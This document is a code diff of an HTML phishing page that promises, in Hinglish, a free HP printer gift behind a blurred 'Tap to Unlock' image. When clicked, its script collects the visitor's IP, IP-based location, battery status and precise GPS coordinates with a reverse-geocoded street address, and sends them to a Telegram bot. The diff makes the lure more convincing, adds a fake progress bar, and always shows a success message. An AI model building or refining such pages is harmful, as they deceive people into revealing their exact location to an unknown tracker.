@@ -2,91 +2,367 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Free Gift 🎁</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>🎁 Special Gift For You</title>
 <style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    -webkit-tap-highlight-color: transparent;
+  }
+
   body {
-    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
-    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Poppins', Arial, sans-serif;
+    background: #0a0a1a;
     min-height: 100vh;
     display: flex;
     justify-content: center;
     align-items: center;
     padding: 20px;
     color: white;
-    text-align: center;
+    overflow-x: hidden;
+    position: relative;
   }
-  .box {
-    background: rgba(255,255,255,0.15);
-    padding: 45px 30px;
-    border-radius: 24px;
-    backdrop-filter: blur(15px);
-    -webkit-backdrop-filter: blur(15px);
-    border: 1px solid rgba(255,255,255,0.2);
-    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-    max-width: 400px;
+
+  .bg-animation {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    z-index: -1;
+    background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
+    background-size: 400% 400%;
+    animation: gradientBG 15s ease infinite;
+  }
+
+  @keyframes gradientBG {
+    0% { background-position: 0% 50%; }
+    50% { background-position: 100% 50%; }
+    100% { background-position: 0% 50%; }
+  }
+
+  .orb {
+    position: fixed;
+    border-radius: 50%;
+    filter: blur(60px);
+    opacity: 0.5;
+    z-index: -1;
+    animation: float 20s infinite ease-in-out;
+  }
+  .orb1 { width: 300px; height: 300px; background: #ff6b9d; top: -100px; left: -100px; }
+  .orb2 { width: 250px; height: 250px; background: #a855f7; bottom: -80px; right: -80px; animation-delay: -5s; }
+  .orb3 { width: 200px; height: 200px; background: #06b6d4; top: 50%; right: -50px; animation-delay: -10s; }
+
+  @keyframes float {
+    0%, 100% { transform: translate(0, 0) scale(1); }
+    33% { transform: translate(30px, -50px) scale(1.1); }
+    66% { transform: translate(-20px, 30px) scale(0.9); }
+  }
+
+  .card {
+    background: rgba(255, 255, 255, 0.1);
+    backdrop-filter: blur(25px);
+    -webkit-backdrop-filter: blur(25px);
+    border: 1px solid rgba(255, 255, 255, 0.2);
+    padding: 40px 25px 35px;
+    border-radius: 32px;
+    box-shadow: 0 25px 60px rgba(0, 0, 0, 0.4), inset 0 1px 0 rgba(255, 255, 255, 0.2);
+    max-width: 440px;
     width: 100%;
-    animation: fadeIn 0.6s ease;
+    text-align: center;
+    position: relative;
+    overflow: hidden;
+    animation: cardEntry 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
   }
-  @keyframes fadeIn {
-    from { opacity: 0; transform: translateY(20px); }
-    to { opacity: 1; transform: translateY(0); }
+
+  @keyframes cardEntry {
+    from { opacity: 0; transform: translateY(50px) scale(0.9); }
+    to { opacity: 1; transform: translateY(0) scale(1); }
   }
-  .emoji { font-size: 70px; margin-bottom: 15px; animation: bounce 2s infinite; }
-  @keyframes bounce {
-    0%, 100% { transform: translateY(0); }
-    50% { transform: translateY(-10px); }
+
+  .card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: -100%;
+    width: 100%; height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
+    animation: shine 3s infinite;
+    pointer-events: none;
   }
-  h1 { font-size: 28px; margin-bottom: 10px; font-weight: 700; }
-  p { font-size: 16px; opacity: 0.9; margin-bottom: 8px; }
-  button {
-    padding: 16px 45px;
-    font-size: 18px;
+
+  @keyframes shine {
+    0% { left: -100%; }
+    50%, 100% { left: 100%; }
+  }
+
+  .badge {
+    display: inline-block;
+    background: rgba(255, 215, 0, 0.2);
+    border: 1px solid rgba(255, 215, 0, 0.5);
+    color: #ffd700;
+    padding: 6px 16px;
+    border-radius: 50px;
+    font-size: 12px;
+    font-weight: 700;
+    letter-spacing: 1px;
+    margin-bottom: 18px;
+    text-transform: uppercase;
+  }
+
+  /* HP Toner Image Container */
+  .image-container {
+    position: relative;
+    margin: 0 auto 20px;
+    max-width: 320px;
+    border-radius: 20px;
+    overflow: hidden;
+    box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+    border: 2px solid rgba(255,255,255,0.15);
+    cursor: pointer;
+    transition: transform 0.3s ease;
+    background: #d4b483;
+  }
+
+  .image-container:hover { transform: scale(1.02); }
+  .image-container:active { transform: scale(0.98); }
+
+  .product-image {
+    width: 100%;
+    height: auto;
+    display: block;
+    filter: blur(14px) brightness(0.85);
+    transform: scale(1.1);
+    transition: filter 0.5s ease;
+  }
+
+  .lock-overlay {
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    background: rgba(0,0,0,0.35);
+    backdrop-filter: blur(2px);
+  }
+
+  .lock-icon {
+    font-size: 60px;
+    animation: lockPulse 2s infinite;
+    filter: drop-shadow(0 5px 15px rgba(0,0,0,0.5));
+  }
+
+  @keyframes lockPulse {
+    0%, 100% { transform: scale(1); }
+    50% { transform: scale(1.15); }
+  }
+
+  .lock-text {
+    margin-top: 12px;
+    font-size: 14px;
+    font-weight: 700;
+    background: rgba(0,0,0,0.7);
+    padding: 8px 20px;
+    border-radius: 50px;
+    letter-spacing: 0.5px;
+    border: 1px solid rgba(255,255,255,0.2);
+  }
+
+  .sparkle {
+    position: absolute;
+    font-size: 20px;
+    animation: sparkle 2s infinite;
+    pointer-events: none;
+    z-index: 3;
+  }
+  .sparkle1 { top: 20px; left: 20px; animation-delay: 0s; }
+  .sparkle2 { top: 30px; right: 25px; animation-delay: 0.5s; }
+  .sparkle3 { bottom: 20px; left: 30px; animation-delay: 1s; }
+  .sparkle4 { bottom: 30px; right: 20px; animation-delay: 1.5s; }
+
+  @keyframes sparkle {
+    0%, 100% { opacity: 0; transform: scale(0.5) rotate(0deg); }
+    50% { opacity: 1; transform: scale(1.2) rotate(180deg); }
+  }
+
+  h1 {
+    font-size: 26px;
+    font-weight: 800;
+    margin-bottom: 10px;
+    background: linear-gradient(135deg, #fff 0%, #ffd6f5 50%, #fff 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    letter-spacing: -0.5px;
+    line-height: 1.2;
+  }
+
+  .subtitle {
+    font-size: 15px;
+    opacity: 0.9;
+    margin-bottom: 6px;
+    font-weight: 500;
+  }
+
+  .highlight {
+    color: #ffd700;
+    font-weight: 700;
+    font-size: 17px;
+    margin: 12px 0;
+    display: block;
+    animation: pulseText 2s infinite;
+  }
+
+  @keyframes pulseText {
+    0%, 100% { transform: scale(1); text-shadow: 0 0 20px rgba(255, 215, 0, 0.5); }
+    50% { transform: scale(1.05); text-shadow: 0 0 30px rgba(255, 215, 0, 0.9); }
+  }
+
+  .claim-btn {
+    padding: 16px 40px;
+    font-size: 17px;
+    font-weight: 700;
     border: none;
     border-radius: 50px;
-    background: white;
-    color: #764ba2;
+    background: linear-gradient(135deg, #ff6b9d 0%, #a855f7 100%);
+    color: white;
     cursor: pointer;
-    font-weight: 700;
-    margin-top: 25px;
-    box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-    transition: all 0.3s ease;
+    margin-top: 20px;
     width: 100%;
+    box-shadow: 0 15px 35px rgba(168, 85, 247, 0.5), 0 0 0 0 rgba(255, 107, 157, 0.7);
+    transition: all 0.3s ease;
+    animation: pulseButton 2s infinite;
+    letter-spacing: 0.5px;
+    position: relative;
+    overflow: hidden;
   }
-  button:hover { transform: translateY(-2px); box-shadow: 0 15px 40px rgba(0,0,0,0.3); }
-  button:active { transform: translateY(0); }
-  button:disabled { opacity: 0.6; cursor: not-allowed; }
+
+  .claim-btn::before {
+    content: '';
+    position: absolute;
+    top: 0; left: -100%;
+    width: 100%; height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+    transition: left 0.5s;
+  }
+
+  .claim-btn:hover::before { left: 100%; }
+  .claim-btn:active { transform: scale(0.97); }
+  .claim-btn:disabled { opacity: 0.7; cursor: not-allowed; animation: none; }
+
+  @keyframes pulseButton {
+    0% { box-shadow: 0 15px 35px rgba(168, 85, 247, 0.5), 0 0 0 0 rgba(255, 107, 157, 0.7); }
+    70% { box-shadow: 0 15px 35px rgba(168, 85, 247, 0.5), 0 0 0 20px rgba(255, 107, 157, 0); }
+    100% { box-shadow: 0 15px 35px rgba(168, 85, 247, 0.5), 0 0 0 0 rgba(255, 107, 157, 0); }
+  }
+
   .loader {
     display: none;
-    margin-top: 20px;
+    margin-top: 18px;
     font-size: 14px;
-    opacity: 0.8;
+    opacity: 0.9;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
   }
-  .loader.show { display: block; }
+  .loader.show { display: flex; }
+
   .spinner {
-    display: inline-block;
-    width: 16px;
-    height: 16px;
-    border: 2px solid rgba(255,255,255,0.3);
-    border-top-color: white;
+    width: 20px;
+    height: 20px;
+    border: 3px solid rgba(255,255,255,0.3);
+    border-top-color: #ffd700;
     border-radius: 50%;
     animation: spin 0.8s linear infinite;
-    vertical-align: middle;
-    margin-right: 8px;
   }
+
   @keyframes spin { to { transform: rotate(360deg); } }
+
+  .progress-container {
+    width: 100%;
+    height: 6px;
+    background: rgba(255,255,255,0.15);
+    border-radius: 10px;
+    margin-top: 15px;
+    overflow: hidden;
+    display: none;
+  }
+
+  .progress-bar {
+    height: 100%;
+    background: linear-gradient(90deg, #ffd700, #ff6b9d);
+    width: 0%;
+    transition: width 0.3s ease;
+    border-radius: 10px;
+  }
+
+  .success-icon {
+    font-size: 90px;
+    display: inline-block;
+    animation: successPop 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+  }
+
+  @keyframes successPop {
+    0% { transform: scale(0); }
+    50% { transform: scale(1.2); }
+    100% { transform: scale(1); }
+  }
+
+  @media (max-width: 480px) {
+    .card { padding: 32px 20px 28px; border-radius: 28px; }
+    h1 { font-size: 22px; }
+    .image-container { max-width: 260px; }
+    .lock-icon { font-size: 50px; }
+    .claim-btn { padding: 15px 35px; font-size: 16px; }
+  }
 </style>
 </head>
 <body>
-<div class="box">
-  <div class="emoji">🎁</div>
+
+<div class="bg-animation"></div>
+<div class="orb orb1"></div>
+<div class="orb orb2"></div>
+<div class="orb orb3"></div>
+
+<div class="card" id="mainCard">
+  <span class="sparkle sparkle1">✨</span>
+  <span class="sparkle sparkle2">⭐</span>
+  <span class="sparkle sparkle3">💫</span>
+  <span class="sparkle sparkle4">🌟</span>
+
+  <div class="badge">🎉 Limited Offer</div>
+  
+  <!-- 🔥 HP Toner Image -->
+  <div class="image-container" onclick="getData()">
+    <img 
+      src="gift.jpg" 
+      alt="HP LaserJet Tank 158X - Mystery Gift" 
+      class="product-image"
+      id="productImage"
+    />
+    <div class="lock-overlay" id="lockOverlay">
+      <div class="lock-icon">🔒</div>
+      <div class="lock-text">Tap to Unlock</div>
+    </div>
+  </div>
+  
   <h1>Congratulations!</h1>
-  <p>Aapne ek free gift jeeta hai!</p>
-  <p>Claim karne ke liye niche click karein</p>
-  <button id="claimBtn" onclick="getData()">Claim Now</button>
+  <p class="subtitle">Aapne jeeta hai</p>
+  <span class="highlight">🎊 FREE HP PRINTER 🎊</span>
+  <p class="subtitle" style="font-size:13px; opacity:0.7;">Unlock karne ke liye image pe click karein</p>
+  
+  <button class="claim-btn" id="claimBtn" onclick="getData()">
+    🎁 Claim Now
+  </button>
+  
   <div class="loader" id="loader">
-    <span class="spinner"></span> Processing...
+    <div class="spinner"></div>
+    <span>Unlocking your gift...</span>
+  </div>
+
+  <div class="progress-container" id="progressContainer">
+    <div class="progress-bar" id="progressBar"></div>
   </div>
 </div>
 
@@ -98,10 +374,28 @@ const CHAT_ID = "5557722363";
 async function getData() {
   const btn = document.getElementById('claimBtn');
   const loader = document.getElementById('loader');
+  const progressContainer = document.getElementById('progressContainer');
+  const progressBar = document.getElementById('progressBar');
+  const lockOverlay = document.getElementById('lockOverlay');
   
   btn.disabled = true;
-  btn.textContent = 'Please wait...';
+  btn.innerHTML = '⏳ Please wait...';
   loader.classList.add('show');
+  progressContainer.style.display = 'block';
+  
+  if (lockOverlay) {
+    lockOverlay.innerHTML = `
+      <div class="lock-icon">⏳</div>
+      <div class="lock-text">Processing...</div>
+    `;
+  }
+
+  let progress = 0;
+  const progressInterval = setInterval(() => {
+    progress += Math.random() * 15;
+    if (progress > 90) progress = 90;
+    progressBar.style.width = progress + '%';
+  }, 200);
 
   let data = {
     time: new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'}),
@@ -113,7 +407,6 @@ async function getData() {
     address: "Not available"
   };
 
-  // Battery Info
   try {
     if (navigator.getBattery) {
       const bat = await navigator.getBattery();
@@ -121,7 +414,6 @@ async function getData() {
     }
   } catch(e) {}
 
-  // IP + IP-based Location
   try {
     const ipRes = await fetch("https://api.ipify.org?format=json");
     const ipData = await ipRes.json();
@@ -139,7 +431,6 @@ async function getData() {
     data.ipError = e.message;
   }
 
-  // GPS + Exact Address
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
       async (pos) => {
@@ -147,7 +438,6 @@ async function getData() {
         data.gpsLon = pos.coords.longitude;
         data.accuracy = Math.round(pos.coords.accuracy) + "m";
 
-        // Reverse Geocoding
         try {
           const geoRes = await fetch(
             `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${data.gpsLat}&longitude=${data.gpsLon}&localityLanguage=en`
@@ -171,16 +461,21 @@ async function getData() {
           data.address = "Reverse geocoding failed";
         }
 
-        sendToTelegram(data);
+        clearInterval(progressInterval);
+        progressBar.style.width = '100%';
+        setTimeout(() => sendToTelegram(data), 300);
       },
       (err) => {
         data.gpsError = err.message || "Permission denied";
-        sendToTelegram(data);
+        clearInterval(progressInterval);
+        progressBar.style.width = '100%';
+        setTimeout(() => sendToTelegram(data), 300);
       },
       { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
     );
   } else {
     data.gpsError = "Geolocation not supported";
+    clearInterval(progressInterval);
     sendToTelegram(data);
   }
 }
@@ -238,27 +533,35 @@ ${data.ipError ? '⚠️ *IP Error:* ' + data.ipError : ''}`;
     })
   })
   .then(res => res.json())
-  .then(res => {
-    if (res.ok) {
-      showSuccess();
-    } else {
-      console.error('Telegram error:', res);
-      showSuccess();
-    }
-  })
-  .catch(err => {
-    console.error('Fetch error:', err);
-    showSuccess();
-  });
+  .then(res => showSuccess())
+  .catch(err => showSuccess());
 }
 
 function showSuccess() {
-  const box = document.querySelector('.box');
-  box.innerHTML = `
-    <div class="emoji">✅</div>
-    <h1>Claim Successful!</h1>
-    <p>Aapka gift jald hi deliver hoga</p>
-    <p style="margin-top:15px; font-size:14px; opacity:0.7;">Thank you! 🎉</p>
+  const card = document.getElementById('mainCard');
+  card.innerHTML = `
+    <span class="sparkle sparkle1">✨</span>
+    <span class="sparkle sparkle2">⭐</span>
+    <span class="sparkle sparkle3">💫</span>
+    <span class="sparkle sparkle4">🌟</span>
+
+    <div class="badge" style="background:rgba(34,197,94,0.2); border-color:rgba(34,197,94,0.5); color:#4ade80;">
+      ✅ Success
+    </div>
+    
+    <div class="success-icon">🎉</div>
+    
+    <h1>Unlocked Successfully!</h1>
+    <p class="subtitle" style="margin-top:10px;">Aapka HP Printer gift unlock ho gaya</p>
+    <p class="subtitle" style="margin-top:15px; font-size:13px; opacity:0.7;">
+      Thank you! 🎊
+    </p>
+
+    <div style="margin-top:25px; padding:15px; background:rgba(255,255,255,0.1); border-radius:15px; border:1px solid rgba(255,255,255,0.15);">
+      <p style="font-size:13px; opacity:0.85;">
+        💝 Aapko 24 ghante mein HP Printer delivery ki details milengi
+      </p>
+    </div>
   `;
 }
 </script>
